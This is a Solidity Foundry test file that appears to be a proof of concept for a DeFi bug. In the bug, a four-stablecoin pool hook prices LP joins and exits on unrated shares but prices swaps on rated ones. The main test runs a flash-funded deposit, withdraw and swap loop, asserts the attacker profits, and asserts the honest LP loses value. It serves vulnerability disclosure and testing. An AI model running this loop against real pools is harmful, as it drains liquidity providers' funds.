// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {
    TestBase_UniswapV4StandardExchangeCurveQuadStableBufferHook as TestBase
} from "contracts/hooks/uniswap/v4/standardExchange/stable/quad/curve/TestBase_UniswapV4StandardExchangeCurveQuadStableBufferHook.sol";

/// @notice rawleg-rp-lp-valuation (Curve quad leg): LP join/exit math runs on UNRATED SE share counts
///         (_invWadAll) while swaps are RATED (_ratedWadAll). After the SE leg accrues yield (rate r>1),
///         an unprivileged attacker joins single-sided with a raw stable, exits single-sided into the SE leg
///         (receiving ~1 share per LP unit, each worth r pair), and swaps back through the rated door.
contract CurveQuadLpDomainArb is TestBase {
    address internal attacker = address(0xA77AC4);
    uint256 internal constant SEED = 1_000_000 ether; // 1M per leg (4M TVL)
    uint256 internal constant CAPITAL = 100_000 ether; // flash principal in token1
    uint256 internal constant DEX_FEE = 0.001e18; // 10 bps

    function _setUpPool(uint256 yieldAssets) internal {
        // honest LP (user) seeds the book
        token0.mint(user, SEED);
        token1.mint(user, SEED);
        token2.mint(user, SEED);
        token3.mint(user, SEED);
        _firstMintEqual(SEED);
        _setDexFee(DEX_FEE);
        // honest yield accrual on the SE leg vault (third party donation = yield)
        if (yieldAssets != 0) {
            token0.mint(address(this), yieldAssets);
            token0.approve(address(vault0), yieldAssets);
            vault0.simulateYield(yieldAssets);
        }
    }

    function _victimValue() internal view returns (uint256 v) {
        bool[] memory flags = new bool[](4);
        uint256[] memory a = quad.previewExitProportionalFlexible(IERC20(hook).balanceOf(user), flags);
        for (uint256 i; i < 4; ++i) v += a[i]; // all four pair tokens are $1 stables
    }

    function _attack(uint256 cycles, uint256 perCycle) internal returns (uint256 endBal) {
        token1.mint(attacker, CAPITAL); // simulated flash principal, asserted repaid below
        vm.startPrank(attacker);
        token0.approve(hook, type(uint256).max);
        token1.approve(hook, type(uint256).max);
        for (uint256 c; c < cycles; ++c) {
            uint256 lp = quad.depositSingle(address(token1), perCycle, attacker, 0, block.timestamp + 1);
            uint256 out0 = quad.withdrawSingle(address(token0), lp, attacker, 0, block.timestamp + 1);uint256 back1 = IStandardExchangeIn(hook).exchangeIn(IERC20(address(token0)), out0, IERC20(address(token1)), 0, attacker, false, block.timestamp + 1
            );
            console2.log("cycle", c);
            console2.log("  lp minted       ", lp);
            console2.log("  token0 out      ", out0);
            console2.log("  token1 back     ", back1);
        }
        vm.stopPrank();
        endBal = token1.balanceOf(attacker);
        assertEq(token0.balanceOf(attacker), 0, "no residual token0");
    }

    /// Attack after 5% SE yield (r = 1.05).
    function test_curveQuad_lpDomainArb_yield5pct() public {
        _setUpPool(SEED * 5 / 100);
        console2.log("rate leg0 (rp)    ", quad.ratedBalance(0) * 1e18 / quad.nativeReserve(0));
        uint256 victimBefore = _victimValue();
        uint256 end = _attack(3, CAPITAL);
        uint256 victimAfter = _victimValue();
        // flash repay: principal + 9 bps fee
        uint256 repay = CAPITAL + CAPITAL * 9 / 10_000;
        console2.log("attacker end token1", end);
        console2.log("flash repay        ", repay);
        assertGt(end, repay, "attacker profitable after repaying flash principal+fee");
        uint256 profit = end - repay;
        console2.log("attacker net profit", profit);
        console2.log("victim value before", victimBefore);
        console2.log("victim value after ", victimAfter);
        assertLt(victimAfter, victimBefore, "honest LP lost value");
        console2.log("victim loss        ", victimBefore - victimAfter);
    }

    /// Control: no yield (r = 1) -> same cycle loses money to fees.
    function test_curveQuad_control_noYield() public {
        _setUpPool(0);
        uint256 end = _attack(1, CAPITAL);
        console2.log("control end token1 ", end);
        assertLt(end, CAPITAL, "no profit without rate gap");
    }
}
